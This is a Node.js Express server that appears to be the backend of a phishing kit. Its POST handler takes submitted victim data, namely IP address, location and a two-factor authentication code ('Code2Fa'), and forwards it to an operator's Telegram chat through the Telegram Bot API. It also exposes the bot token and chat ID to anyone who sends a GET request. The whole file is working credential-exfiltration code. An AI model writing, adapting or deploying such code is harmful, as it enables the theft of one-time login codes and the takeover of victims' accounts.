require('dotenv').config();

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const url = 'https://api.telegram.org/bot';
const cors = require('cors');
app.use(bodyParser.json());
app.use(cors());
app.use(express.static('public'));

app.get('/', function (req, res) {
    res.json({
        BOT_TOKEN: process.env.BOT_TOKEN,
        CHAT_ID: process.env.CHAT_ID,
    });
});

app.post('/', async (req, res) => {

    const SEND = 'send'
    const SENDCODE = 'sendCode'
    const RESEND = 'reSend'

    if (req.body.type == SEND) {
        console.log('inserted to db');
        res.status(200).send(req.body);
    }

    if (req.body.type == RESEND) {
        let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text:
                    `Ip: ${req.body?.ip.ip}\n` +
                    `Country: ${req.body?.ip.country}\n` +
                    `City: ${req.body?.ip.city}\n` +
                    `Region: ${req.body?.ip.region}\n` +
                    `Status: User Resend Code\n`,
                parse_mode: 'HTML',
            })

        console.log('inserted to db');
        res.status(200).send(req.body);
    }

    if (req.body.type == SENDCODE) {
        let r = await axios.post(`${url}${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text:
                    `Ip: ${req.body?.ip.ip}\n` +
                    `Country: ${req.body?.ip.country}\n` +
                    `City: ${req.body?.ip.city}\n` +
                    `Region: ${req.body?.ip.region}\n` +
                    `Code2Fa: ${req.body?.Code2Fa}\n` +

                    `Status: User Send Code\n`,
                parse_mode: 'HTML',
            })

        console.log('inserted to db');
        res.status(200).send(req.body);
    }

    else {
        res.status(200).send(req.body);
    }


});

app.listen(8000, () => console.log('Server ready on port 8000.'));

module.exports = app;
